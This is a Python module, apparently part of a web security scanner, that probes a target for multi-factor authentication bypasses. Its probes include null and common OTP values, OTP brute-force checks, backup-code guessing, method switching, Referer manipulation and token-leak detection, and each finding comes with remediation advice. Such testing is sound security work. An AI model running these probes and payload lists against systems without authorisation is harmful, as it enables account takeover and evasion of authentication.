"""
MFA/2FA Bypass Module — Tests for weak multi-factor authentication.

Tests for:
1. Direct access bypass — skip 2FA step by directly requesting authenticated pages
2. Null/empty OTP — submit empty or null OTP field
3. Brute force OTP — 4-6 digit codes have limited keyspace
4. OTP reuse — same OTP accepted multiple times
5. Rate limit bypass — no lockout after N wrong OTPs
6. Backup code weakness — predictable or common backup codes
7. Response token leak — 2FA token/session leaked in API response
8. Method switch — GET instead of POST (or vice versa) on verification endpoint
9. Referrer bypass — accessing 2FA-protected page via specific referrer
10. Default/common OTPs — developer backdoors left in production
"""
import asyncio
import json
import logging
import re
import time
from urllib.parse import urljoin, urlparse

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# Common 2FA/MFA related paths
MFA_PATHS = [
    "/2fa", "/mfa", "/otp", "/verify", "/two-factor", "/two_factor",
    "/second-factor", "/auth/2fa", "/auth/mfa", "/auth/verify",
    "/api/2fa/verify", "/api/mfa/verify", "/api/otp/verify",
    "/account/2fa", "/login/2fa", "/login/verify",
    "/challenge", "/auth/challenge",
    "/api/auth/2fa", "/api/v1/auth/2fa", "/api/v1/auth/verify",
    "/api/v1/mfa/verify", "/api/v2/auth/verify",
    "/auth/totp", "/auth/otp/verify", "/totp/verify",
    "/mfa/challenge", "/mfa/verify", "/mfa/totp",
    "/security/2fa", "/security/verify",
    "/api/security/2fa", "/api/security/verify",
    "/two-factor-auth", "/two-factor/verify",
]

# Common OTP field names (used when submitting OTP forms)
OTP_FIELDS = [
    "otp", "code", "token", "totp", "mfa_code", "verification_code",
    "otp_code", "two_factor_code", "pin", "sms_code", "auth_code",
    "verificationCode", "otpCode", "twoFactorCode", "mfaCode",
    "2fa_code", "2fa", "mfa", "passcode", "one_time_password",
]

# Protected pages to try accessing after partial auth
PROTECTED_PATHS = [
    "/dashboard", "/account", "/profile", "/admin",
    "/settings", "/api/me", "/api/user", "/home",
    "/panel", "/console", "/app", "/portal",
    "/api/v1/me", "/api/v1/user/profile", "/api/account",
    "/user/dashboard", "/admin/dashboard", "/main",
]

# Common OTP values (dev backdoors, weak defaults)
COMMON_OTPS = [
    "123456", "000000", "111111", "654321", "123123",
    "112233", "121212", "1234", "0000", "9999",
    "696969", "420420", "999999", "888888", "777777",
    "111222", "222222", "333333", "444444", "555555",
    "666666", "101010", "123321", "147258", "159753",
]

# Common backup codes
COMMON_BACKUP_CODES = [
    "12345678", "00000000", "abcdefgh", "backup", "recovery",
    "11111111", "87654321", "admin123", "00000001", "99999999",
    "AAAAAAAA", "12341234", "abcd1234", "qwerty12", "password",
    "recovery1", "backup01", "master00", "reset123",
]

# Null/empty OTP variants
NULL_OTP_VALUES = [
    "", " ", "0", "000000", "null", "undefined", "none", "true",
    "false", "[]", "{}", "0000", "00000000", "NaN", "nil",
]


class MFABypassModule:
    """Test for weak or bypassable multi-factor authentication."""

    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def run(self, context: dict) -> list[dict]:
        """Run all MFA bypass tests."""
        findings = []
        base_url = context.get("base_url", "")
        if not base_url:
            return []

        endpoints = context.get("endpoints", [])

        # Step 1: Discover 2FA/MFA endpoints
        mfa_endpoints = await self._discover_mfa_endpoints(base_url, endpoints)

        if not mfa_endpoints:
            # Try to trigger 2FA by logging in with known creds
            mfa_endpoints = await self._trigger_mfa_flow(base_url, context)

        if not mfa_endpoints:
            logger.info("MFA bypass: no 2FA endpoints found, skipping")
            return []

        logger.info(f"MFA bypass: found {len(mfa_endpoints)} MFA endpoints")

        # Step 2: Analyze MFA endpoints and extract form fields
        mfa_forms = []
        for ep in mfa_endpoints[:5]:
            form = await self._analyze_mfa_endpoint(ep)
            if form:
                mfa_forms.append(form)

        if not mfa_forms:
            # Even without forms, test direct bypass and method switch
            for ep_url in mfa_endpoints[:5]:
                result = await self._test_direct_bypass(ep_url, base_url, context)
                if result:
                    findings.append(result)
                result = await self._test_method_switch(ep_url)
                if result:
                    findings.append(result)
            return findings

        # Step 3: Run bypass tests on each MFA form
        for form in mfa_forms:
            mfa_url = form["url"]

            # Test direct access bypass
            result = await self._test_direct_bypass(mfa_url, base_url, context)
            if result:
                findings.append(result)

            # Test null/empty OTP
            result = await self._test_null_otp(form)
            if result:
                findings.append(result)

            # Test common OTP values
            result = await self._test_common_otps(form)
            if result:
                findings.append(result)

            # Test OTP brute force feasibility (rate limiting check)
            result = await self._test_otp_bruteforce(form)
            if result:
                findings.append(result)

            # Test response token leak
            result = await self._test_response_leak(form)
            if result:
                findings.append(result)

            # Test method switch
            result = await self._test_method_switch(mfa_url)
            if result:
                findings.append(result)

            # Test backup codes
            result = await self._test_backup_codes(form)
            if result:
                findings.append(result)

            # Test referrer bypass
            result = await self._test_referrer_bypass(mfa_url, base_url, context)
            if result:
                findings.append(result)

        logger.info(f"MFA bypass: {len(findings)} findings")
        return findings

    # ── Discovery ──────────────────────────────────────────────────────

    async def _discover_mfa_endpoints(self, base_url: str, endpoints: list) -> list[str]:
        """Find MFA/2FA endpoints by probing common paths and checking discovered endpoints."""
        found = []

        # Check discovered endpoints for MFA keywords
        mfa_keywords = ["2fa", "mfa", "otp", "two-factor", "two_factor", "totp",
                        "verify", "challenge", "second-factor"]
        for ep in endpoints:
            ep_url = ep.get("url") if isinstance(ep, dict) else ep
            if not ep_url or not isinstance(ep_url, str):
                continue
            lower = ep_url.lower()
            if any(kw in lower for kw in mfa_keywords):
                if ep_url not in found:
                    found.append(ep_url)

        # Probe common MFA paths
        async with make_client(timeout=8.0, follow_redirects=True) as client:
            for path in MFA_PATHS:
                url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
                if url in found:
                    continue
                try:
                    async with self.rate_limit:
                        resp = await client.get(url)
                        if resp.status_code in (200, 401, 403):
                            ct = resp.headers.get("content-type", "")
                            body = resp.text.lower()
                            # Check if page is MFA-related
                            if any(kw in body for kw in [
                                "verification code", "otp", "two-factor",
                                "authenticator", "enter code", "mfa",
                                "one-time password", "6-digit", "4-digit",
                                "sms code", "backup code",
                            ]):
                                found.append(url)
                            elif resp.status_code == 200 and "application/json" in ct:
                                # API endpoint — check JSON response
                                try:
                                    data = resp.json()
                                    text = json.dumps(data).lower()
                                    if any(kw in text for kw in ["otp", "2fa", "mfa", "totp"]):
                                        found.append(url)
                                except Exception:
                                    pass
                except Exception:
                    continue

        return found

    async def _trigger_mfa_flow(self, base_url: str, context: dict) -> list[str]:
        """Try logging in with known credentials to reach the 2FA page."""
        found = []
        # Check if auth_attack found working credentials
        scan_results = context.get("scan_results", {})
        if not isinstance(scan_results, dict):
            scan_results = {}
        auth_results = scan_results.get("auth_attack", [])
        if not isinstance(auth_results, list):
            auth_results = [auth_results] if isinstance(auth_results, dict) else []

        working_creds = None
        for r in auth_results:
            if not isinstance(r, dict):
                continue
            if "Default credentials work" in r.get("title", ""):
                payload = r.get("payload", "")
                if "=" in payload:
                    parts = payload.split("&")
                    cred = {}
                    for p in parts:
                        if "=" in p:
                            k, v = p.split("=", 1)
                            cred[k] = v
                    if cred:
                        working_creds = cred
                        break

        if not working_creds:
            return []

        # Try logging in and check if we hit a 2FA page
        login_paths = ["/login", "/signin", "/auth/login", "/api/login",
                       "/api/auth/login", "/api/v1/auth/login"]

        async with make_client(timeout=10.0, follow_redirects=False) as client:
            for path in login_paths:
                url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
                try:
                    async with self.rate_limit:
                        resp = await client.post(url, data=working_creds)
                        # Check redirect to 2FA page
                        if resp.status_code in (301, 302, 303, 307):
                            location = resp.headers.get("location", "")
                            if location:
                                lower = location.lower()
                                if any(kw in lower for kw in ["2fa", "mfa", "otp", "verify",
                                                               "challenge", "two-factor"]):
                                    redirect_url = urljoin(url, location)
                                    found.append(redirect_url)
                        # Check response body for 2FA indication
                        elif resp.status_code == 200:
                            body = resp.text.lower()
                            if any(kw in body for kw in ["enter.*code", "verification",
                                                          "two.factor", "authenticator"]):
                                found.append(url)
                except Exception:
                    continue

        return found

    async def _analyze_mfa_endpoint(self, url: str) -> dict | None:
        """Analyze an MFA endpoint to extract form fields and behavior."""
        try:
            async with make_client(timeout=8.0) as client:
                async with self.rate_limit:
                    resp = await client.get(url)

                ct = resp.headers.get("content-type", "")
                body = resp.text

                # JSON API endpoint
                if "application/json" in ct:
                    return {
                        "url": url,
                        "type": "api",
                        "method": "POST",
                        "otp_field": self._detect_otp_field_from_json(body),
                        "extra_fields": {},
                    }

                # HTML form
                if "text/html" in ct:
                    form = self._extract_otp_form(body, url)
                    if form:
                        return form

                # Fallback — treat as API with common field name
                return {
                    "url": url,
                    "type": "api",
                    "method": "POST",
                    "otp_field": "code",
                    "extra_fields": {},
                }

        except Exception as e:
            logger.debug(f"MFA analyze failed for {url}: {e}")
            return None

    def _extract_otp_form(self, html: str, page_url: str) -> dict | None:
        """Parse HTML to find OTP/MFA form."""
        try:
            from bs4 import BeautifulSoup
        except ImportError:
            return None

        soup = BeautifulSoup(html, "html.parser")

        for form in soup.find_all("form"):
            inputs = form.find_all("input")
            otp_field = None
            extra_fields = {}

            for inp in inputs:
                inp_type = (inp.get("type") or "text").lower()
                inp_name = inp.get("name") or inp.get("id") or ""

                if inp_type == "hidden":
                    extra_fields[inp_name] = inp.get("value", "")
                elif inp_type in ("text", "number", "tel", "password"):
                    lower_name = inp_name.lower()
                    if any(kw in lower_name for kw in OTP_FIELDS):
                        otp_field = inp_name
                    elif not otp_field:
                        # Could be a generic input for OTP
                        maxlen = inp.get("maxlength", "")
                        placeholder = (inp.get("placeholder") or "").lower()
                        if maxlen in ("4", "6", "8") or any(
                            kw in placeholder for kw in ["code", "otp", "pin", "digit"]
                        ):
                            otp_field = inp_name

            if otp_field:
                action = form.get("action", "")
                if action and not action.startswith("http"):
                    action = urljoin(page_url, action)
                elif not action:
                    action = page_url

                method = (form.get("method") or "POST").upper()
                return {
                    "url": action,
                    "type": "form",
                    "method": method,
                    "otp_field": otp_field,
                    "extra_fields": extra_fields,
                }

        return None

    def _detect_otp_field_from_json(self, body: str) -> str:
        """Detect OTP field name from JSON API response."""
        try:
            data = json.loads(body)
            text = json.dumps(data).lower()
            for field in OTP_FIELDS:
                if field in text:
                    return field
        except Exception:
            pass
        return "code"

    # ── Bypass Tests ──────────────────────────────────────────────────

    async def _test_direct_bypass(self, mfa_url: str, base_url: str, context: dict) -> dict | None:
        """After hitting 2FA page, try directly accessing authenticated pages."""
        bypassed = []

        async with make_client(timeout=8.0, follow_redirects=False) as client:
            # First, visit MFA page to get partial-auth cookies
            try:
                async with self.rate_limit:
                    mfa_resp = await client.get(mfa_url)
                    cookies = dict(client.cookies)
            except Exception:
                return None

            if not cookies:
                return None

            # Now try accessing protected pages with the partial-auth cookies
            for path in PROTECTED_PATHS:
                url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
                try:
                    async with self.rate_limit:
                        resp = await client.get(url)
                        if resp.status_code == 200:
                            body = resp.text.lower()
                            # Check if we got actual content (not login redirect)
                            if not any(kw in body for kw in [
                                "login", "sign in", "authenticate", "enter your",
                                "unauthorized", "forbidden",
                            ]) and len(body) > 500:
                                # Check for authenticated content indicators
                                if any(kw in body for kw in [
                                    "dashboard", "welcome", "profile", "settings",
                                    "logout", "sign out", "account", "admin",
                                ]):
                                    bypassed.append(url)
                                    if len(bypassed) >= 3:
                                        break
                except Exception:
                    continue

        if bypassed:
            return {
                "title": "2FA/MFA direct access bypass — authenticated pages accessible without completing 2FA",
                "url": mfa_url,
                "severity": "critical",
                "vuln_type": "auth_bypass",
                "payload": f"Visit {mfa_url} then directly access {bypassed[0]}",
                "impact": f"2FA can be completely bypassed by skipping the verification step. "
                          f"After partial login, {len(bypassed)} protected pages accessible: "
                          f"{', '.join(bypassed[:3])}",
                "remediation": "Enforce 2FA completion server-side before granting access to any "
                               "authenticated resource. Use session flags that are only set after "
                               "full 2FA verification.",
            }
        return None

    async def _test_null_otp(self, form: dict) -> dict | None:
        """Submit various null/empty/zero values for OTP field."""
        url = form["url"]
        otp_field = form["otp_field"]
        extra = dict(form.get("extra_fields", {}))

        # Get baseline with a definitely-wrong OTP
        baseline = await self._submit_otp(form, "PHANTOM_INVALID_OTP_XZ9")
        if not baseline:
            return None

        baseline_status = baseline["status"]
        baseline_len = baseline["body_len"]

        accepted_values = []

        async with make_client(timeout=8.0, follow_redirects=False) as client:
            for null_val in NULL_OTP_VALUES:
                try:
                    async with self.rate_limit:
                        data = dict(extra)
                        data[otp_field] = null_val

                        if form["method"] == "POST":
                            resp = await client.post(url, data=data)
                        else:
                            resp = await client.get(url, params=data)

                        result = self._analyze_otp_response(resp, baseline)
                        if result == "accepted":
                            accepted_values.append(repr(null_val))
                            if len(accepted_values) >= 3:
                                break
                except Exception:
                    continue

        if accepted_values:
            return {
                "title": "2FA accepts null/empty OTP values",
                "url": url,
                "severity": "critical",
                "vuln_type": "auth_bypass",
                "payload": f"{otp_field}={accepted_values[0]}",
                "impact": f"2FA verification accepts null/empty values for OTP field. "
                          f"Accepted values: {', '.join(accepted_values)}. "
                          f"An attacker can bypass 2FA without knowing the OTP.",
                "remediation": "Validate OTP input server-side — reject empty, null, zero, "
                               "and non-numeric values. Ensure OTP validation is strict.",
            }
        return None

    async def _test_common_otps(self, form: dict) -> dict | None:
        """Try common OTP values that work due to dev backdoors."""
        url = form["url"]
        otp_field = form["otp_field"]

        baseline = await self._submit_otp(form, "PHANTOM_INVALID_OTP_XZ9")
        if not baseline:
            return None

        accepted = []

        for otp in COMMON_OTPS:
            try:
                result_resp = await self._submit_otp(form, otp)
                if not result_resp:
                    continue
                status = self._analyze_otp_response_dict(result_resp, baseline)
                if status == "accepted":
                    accepted.append(otp)
                    break  # One is enough to prove the issue
            except Exception:
                continue

        if accepted:
            return {
                "title": f"2FA accepts common/default OTP: {accepted[0]}",
                "url": url,
                "severity": "critical",
                "vuln_type": "auth_bypass",
                "payload": f"{otp_field}={accepted[0]}",
                "impact": f"2FA verification accepts common OTP value '{accepted[0]}'. "
                          f"This is likely a developer backdoor left in production.",
                "remediation": "Remove all hardcoded/default OTP values. Ensure OTP validation "
                               "only accepts the current time-based or SMS-delivered code.",
            }
        return None

    async def _test_otp_bruteforce(self, form: dict) -> dict | None:
        """Test if rate limiting exists for OTP attempts.

        Send 20 wrong OTPs rapidly. If no lockout/slowdown/CAPTCHA, the OTP
        is bruteforceable (4-digit = 10k combos, 6-digit = 1M combos).
        """
        url = form["url"]
        otp_field = form["otp_field"]

        statuses = []
        blocked = False
        lockout_after = None

        for i in range(20):
            wrong_otp = f"{i:06d}"  # 000000 through 000019
            try:
                result = await self._submit_otp(form, wrong_otp)
                if not result:
                    continue

                status = result["status"]
                statuses.append(status)

                # Check for rate limiting / lockout signals
                body = result.get("body", "").lower()
                if status == 429:
                    blocked = True
                    lockout_after = i + 1
                    break
                if any(kw in body for kw in [
                    "locked", "too many", "rate limit", "try again later",
                    "temporarily blocked", "captcha", "slow down",
                    "account locked", "exceeded",
                ]):
                    blocked = True
                    lockout_after = i + 1
                    break

                # Check for progressive delays (response time increasing)
                resp_time = result.get("elapsed", 0)
                if resp_time > 5.0 and i > 5:
                    blocked = True
                    lockout_after = i + 1
                    break

            except Exception:
                continue

        if not blocked and len(statuses) >= 15:
            return {
                "title": "2FA OTP brute force possible — no rate limiting",
                "url": url,
                "severity": "high",
                "vuln_type": "auth_bypass",
                "payload": f"20 rapid OTP attempts to {url} with no lockout",
                "impact": f"No rate limiting on OTP verification endpoint. "
                          f"Sent 20 wrong OTPs without being blocked. "
                          f"4-digit OTP can be brute forced in ~1,000 requests, "
                          f"6-digit in ~100,000 requests — both feasible without lockout.",
                "remediation": "Implement rate limiting on OTP verification: max 3-5 attempts "
                               "before lockout. Use exponential backoff. Invalidate OTP after "
                               "N failed attempts and require re-generation.",
            }
        return None

    async def _test_response_leak(self, form: dict) -> dict | None:
        """Check if the 2FA page/API response leaks the OTP or session token."""
        url = form["url"]

        try:
            async with make_client(timeout=8.0) as client:
                async with self.rate_limit:
                    # Request the MFA page/API
                    resp = await client.get(url)

                body = resp.text
                headers_str = str(dict(resp.headers))
                combined = body + "\n" + headers_str

                leaks = []

                # Check for OTP/token in response
                otp_patterns = [
                    (r'"otp"\s*:\s*"(\d{4,8})"', "OTP in JSON response"),
                    (r'"code"\s*:\s*"(\d{4,8})"', "Code in JSON response"),
                    (r'"token"\s*:\s*"([a-zA-Z0-9]{20,})"', "Token in JSON response"),
                    (r'"secret"\s*:\s*"([A-Z2-7]{16,})"', "TOTP secret in response"),
                    (r'"session_token"\s*:\s*"([^"]+)"', "Session token in response"),
                    (r'"auth_token"\s*:\s*"([^"]+)"', "Auth token in response"),
                    (r'"jwt"\s*:\s*"(eyJ[^"]+)"', "JWT in response"),
                    (r'data-otp="(\d{4,8})"', "OTP in HTML attribute"),
                    (r'value="(\d{6})"[^>]*name=".*otp', "OTP pre-filled in form"),
                    (r'verification.code.*?(\d{4,8})', "Verification code in text"),
                ]

                for pattern, desc in otp_patterns:
                    matches = re.findall(pattern, combined, re.IGNORECASE)
                    if matches:
                        leaks.append(f"{desc}: {matches[0][:30]}...")

                # Check headers for tokens
                for header_name in ["x-otp", "x-verification-code", "x-auth-token",
                                     "x-session-token", "authorization"]:
                    val = resp.headers.get(header_name, "")
                    if val:
                        leaks.append(f"Token in {header_name} header: {val[:30]}...")

                if leaks:
                    return {
                        "title": "2FA verification token/OTP leaked in response",
                        "url": url,
                        "severity": "critical",
                        "vuln_type": "info_disclosure",
                        "payload": f"GET {url}",
                        "impact": f"The 2FA endpoint leaks sensitive information in its response: "
                                  f"{'; '.join(leaks[:3])}. An attacker can extract the OTP or "
                                  f"session token directly from the response without completing 2FA.",
                        "remediation": "Never include OTP, TOTP secrets, or session tokens in "
                                       "client-facing responses. Tokens should only be validated "
                                       "server-side.",
                    }

        except Exception as e:
            logger.debug(f"MFA response leak test failed for {url}: {e}")

        return None

    async def _test_method_switch(self, mfa_url: str) -> dict | None:
        """Try GET instead of POST (or vice versa) on verification endpoint."""
        try:
            async with make_client(timeout=8.0, follow_redirects=False) as client:
                # Try GET with OTP params
                test_params = {}
                for field in OTP_FIELDS[:5]:
                    test_params[field] = "123456"

                async with self.rate_limit:
                    get_resp = await client.get(mfa_url, params=test_params)

                async with self.rate_limit:
                    post_resp = await client.post(mfa_url, data=test_params)

                # Check if one method bypasses validation
                get_ok = self._looks_authenticated(get_resp)
                post_ok = self._looks_authenticated(post_resp)

                if get_ok and not post_ok:
                    return {
                        "title": "2FA bypass via HTTP method switch (GET accepted)",
                        "url": mfa_url,
                        "severity": "high",
                        "vuln_type": "auth_bypass",
                        "payload": f"GET {mfa_url}?code=123456",
                        "impact": "2FA verification can be bypassed by switching from POST to GET. "
                                  "The GET handler does not properly validate the OTP.",
                        "remediation": "Ensure both GET and POST handlers enforce the same OTP "
                                       "validation. Prefer only accepting POST for OTP submission.",
                    }
                elif post_ok and not get_ok:
                    # Less common but worth noting if POST with dummy OTP works
                    pass

                # Also try PUT, PATCH, DELETE
                for method_name in ["PUT", "PATCH"]:
                    async with self.rate_limit:
                        alt_resp = await client.request(method_name, mfa_url, data=test_params)
                    if self._looks_authenticated(alt_resp):
                        return {
                            "title": f"2FA bypass via HTTP method switch ({method_name} accepted)",
                            "url": mfa_url,
                            "severity": "high",
                            "vuln_type": "auth_bypass",
                            "payload": f"{method_name} {mfa_url}",
                            "impact": f"2FA verification can be bypassed using {method_name} method. "
                                      f"The endpoint does not properly validate OTP for this HTTP method.",
                            "remediation": "Restrict the verification endpoint to accept only the "
                                           "intended HTTP method (typically POST). Reject all others.",
                        }
        except Exception as e:
            logger.debug(f"MFA method switch test failed: {e}")

        return None

    async def _test_backup_codes(self, form: dict) -> dict | None:
        """Try common backup codes and predictable patterns."""
        url = form["url"]
        otp_field = form["otp_field"]

        baseline = await self._submit_otp(form, "PHANTOM_INVALID_BACKUP_XZ9")
        if not baseline:
            return None

        # Try submitting backup codes to the OTP field
        accepted = []
        for code in COMMON_BACKUP_CODES:
            try:
                result = await self._submit_otp(form, code)
                if not result:
                    continue
                status = self._analyze_otp_response_dict(result, baseline)
                if status == "accepted":
                    accepted.append(code)
                    break
            except Exception:
                continue

        # Also check for dedicated backup code endpoints
        parsed = urlparse(url)
        backup_paths = [
            "/backup-code", "/backup_code", "/recovery-code",
            "/auth/backup", "/auth/recovery", "/mfa/backup",
            "/api/2fa/backup", "/api/mfa/backup",
        ]

        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in backup_paths:
            bp_url = base + path
            try:
                async with make_client(timeout=8.0) as client:
                    async with self.rate_limit:
                        resp = await client.post(bp_url, data={otp_field: "12345678"})
                        if resp.status_code == 200:
                            body = resp.text.lower()
                            if any(kw in body for kw in [
                                "success", "verified", "authenticated", "welcome",
                            ]):
                                accepted.append(f"12345678 via {bp_url}")
                                break
            except Exception:
                continue

        if accepted:
            return {
                "title": f"2FA bypass via weak backup code: {accepted[0]}",
                "url": url,
                "severity": "high",
                "vuln_type": "auth_bypass",
                "payload": f"{otp_field}={accepted[0]}",
                "impact": f"2FA backup code mechanism accepts common/predictable codes. "
                          f"Accepted: {accepted[0]}",
                "remediation": "Generate cryptographically random backup codes (min 8 chars, "
                               "alphanumeric). Each code should only be usable once. "
                               "Do not use predictable or common values.",
            }
        return None

    async def _test_referrer_bypass(self, mfa_url: str, base_url: str,
                                     context: dict) -> dict | None:
        """Test if accessing 2FA-protected pages with specific referrer bypasses 2FA."""
        try:
            async with make_client(timeout=8.0, follow_redirects=False) as client:
                # First: access protected page normally (should redirect to 2FA)
                async with self.rate_limit:
                    normal_resp = await client.get(base_url + "/dashboard")
                    normal_status = normal_resp.status_code

                # Try with internal referrer
                referrers = [
                    base_url + "/admin",
                    base_url + "/dashboard",
                    base_url + "/",
                    "https://accounts.google.com/",
                ]

                for ref in referrers:
                    async with self.rate_limit:
                        resp = await client.get(
                            base_url + "/dashboard",
                            headers={"Referer": ref},
                        )
                        if (resp.status_code == 200 and
                                normal_status in (301, 302, 303, 307, 401, 403)):
                            body = resp.text.lower()
                            if any(kw in body for kw in [
                                "dashboard", "welcome", "profile", "admin",
                            ]):
                                return {
                                    "title": "2FA bypass via Referer header manipulation",
                                    "url": base_url + "/dashboard",
                                    "severity": "high",
                                    "vuln_type": "auth_bypass",
                                    "payload": f"Referer: {ref}",
                                    "impact": "2FA-protected pages are accessible by setting "
                                              "a specific Referer header, bypassing 2FA entirely.",
                                    "remediation": "Do not use Referer headers for access control. "
                                                   "Enforce 2FA completion via server-side session state.",
                                }
        except Exception as e:
            logger.debug(f"MFA referrer bypass test failed: {e}")

        return None

    # ── Helpers ────────────────────────────────────────────────────────

    async def _submit_otp(self, form: dict, otp_value: str) -> dict | None:
        """Submit an OTP value and return response details."""
        url = form["url"]
        otp_field = form["otp_field"]
        extra = dict(form.get("extra_fields", {}))

        try:
            async with make_client(timeout=8.0, follow_redirects=False) as client:
                async with self.rate_limit:
                    data = dict(extra)
                    data[otp_field] = otp_value

                    start = time.monotonic()
                    if form["method"] == "POST":
                        resp = await client.post(url, data=data)
                    else:
                        resp = await client.get(url, params=data)
                    elapsed = time.monotonic() - start

                    return {
                        "status": resp.status_code,
                        "body": resp.text,
                        "body_len": len(resp.text),
                        "headers": dict(resp.headers),
                        "elapsed": elapsed,
                    }
        except Exception:
            return None

    def _analyze_otp_response(self, resp, baseline: dict) -> str:
        """Compare OTP response against baseline to detect acceptance."""
        body = resp.text.lower()
        status = resp.status_code

        # Clear success indicators
        if any(kw in body for kw in [
            "success", "verified", "authenticated", "welcome",
            "dashboard", "logged in", "login successful",
        ]):
            return "accepted"

        # Redirect to authenticated area
        if status in (301, 302, 303, 307):
            location = resp.headers.get("location", "").lower()
            if any(kw in location for kw in [
                "dashboard", "home", "profile", "account", "admin",
            ]) and not any(kw in location for kw in ["login", "2fa", "verify"]):
                return "accepted"

        # Different status than baseline (baseline should be error)
        baseline_status = baseline.get("status", 0)
        if status == 200 and baseline_status in (400, 401, 403, 422):
            return "accepted"

        return "rejected"

    def _analyze_otp_response_dict(self, result: dict, baseline: dict) -> str:
        """Compare OTP response dict against baseline."""
        body = result.get("body", "").lower()
        status = result["status"]

        if any(kw in body for kw in [
            "success", "verified", "authenticated", "welcome",
            "dashboard", "logged in", "login successful",
        ]):
            return "accepted"

        # Redirect to authenticated area
        if status in (301, 302, 303, 307):
            location = result.get("headers", {}).get("location", "").lower()
            if any(kw in location for kw in [
                "dashboard", "home", "profile", "account", "admin",
            ]) and not any(kw in location for kw in ["login", "2fa", "verify"]):
                return "accepted"

        baseline_status = baseline.get("status", 0)
        if status == 200 and baseline_status in (400, 401, 403, 422):
            return "accepted"

        # Significant body length difference (could indicate different page)
        baseline_len = baseline.get("body_len", 0)
        if baseline_len > 0 and result.get("body_len", 0) > 0:
            ratio = result["body_len"] / baseline_len
            if ratio > 2.0 or ratio < 0.3:
                # Big difference — check for auth indicators
                if any(kw in body for kw in ["logout", "sign out", "my account"]):
                    return "accepted"

        return "rejected"

    def _looks_authenticated(self, resp) -> bool:
        """Check if a response looks like an authenticated page."""
        if resp.status_code not in (200,):
            return False
        body = resp.text.lower()
        if len(body) < 200:
            return False
        auth_indicators = ["dashboard", "welcome", "profile", "logout",
                           "sign out", "my account", "admin panel"]
        fail_indicators = ["login", "sign in", "unauthorized", "forbidden",
                           "access denied", "authenticate"]
        has_auth = any(kw in body for kw in auth_indicators)
        has_fail = any(kw in body for kw in fail_indicators)
        return has_auth and not has_fail
